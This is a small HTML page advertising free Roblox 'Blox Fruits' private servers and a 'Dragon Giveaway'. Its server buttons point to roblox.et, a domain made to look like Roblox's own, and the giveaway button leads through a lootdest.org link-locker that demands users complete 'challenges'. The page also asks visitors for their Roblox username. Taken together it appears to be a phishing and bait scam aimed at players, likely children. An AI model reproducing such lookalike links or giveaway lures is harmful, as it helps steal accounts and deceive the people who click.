<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOLD SERVERS</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to right, #2e026d, #15162c);
            color: white;
            text-align: center;
            padding: 20px;
            overflow-x: hidden;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
            to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
        }
        nav a {
            color: white;
            text-decoration: none;
            margin: 0 15px;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #FFD700;
        }
        .server, .giveaway, .feedback-form {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            margin: 20px auto;
            width: 60%;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            border: 1px solid #6a0dad;
        }
        .server button, .giveaway button {
            background-color: #FFD700;
            border: none;
            padding: 10px 20px;
            color: #000;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .server button:hover, .giveaway button:hover {
            background-color: #FFA500;
        }
        .warning {
            color: #FF4500;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <header>
        <h1 style="color: #A020F0; animation: glow 2s infinite alternate;">GOLD SERVERS</h1>
        <nav>
            <a href="#">Home</a>
            <a href="#dashboard">Dashboard</a>
            <a href="#feedback">Feedback</a>
        </nav>
    </header><main>
    <div id="server-list"></div>

    <section class="giveaway">
        <h2>üêâ Dragon Giveaway!</h2>
        <p>Join the giveaway and complete the challenges to win!</p>
        <p class="warning">‚ö†Ô∏è If you try to skip all the challenges, you will not get anything!</p>
        <button onclick="window.open('https://lootdest.org/s?Lx3KSO1X', '_blank')">Enter Giveaway</button>
    </section>

    <section class="feedback-form" id="feedback">
        <h2>Report Bugs / Rate Our Site</h2>
        <form id="feedback-form">
            <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
            <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
            <button type="submit">Submit Feedback</button>
        </form>
    </section>
</main>

<script>
    const servers = [
        {
            name: "BloxFruit Server 1",
            link: "https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756"
        },
        {
            name: "BloxFruit Server 2",
            link: "https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756"
        }
    ];

    const serverList = document.getElementById('server-list');

    servers.forEach(server => {
        const section = document.createElement('section');
        section.className = 'server';
        section.innerHTML = `
            <h2>${server.name}</h2>
            <button onclick="window.open('${server.link}', '_blank')">Join Server</button>
        `;
        serverList.appendChild(section);
    });

    document.getElementById('feedback-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('feedback-user').value;
        const message = document.getElementById('feedback-message').value;

        if (username && message) {
            alert('Feedback submitted!');
        } else {
            alert('Please fill out all fields.');
        }
    });
</script>

</body>
</html>
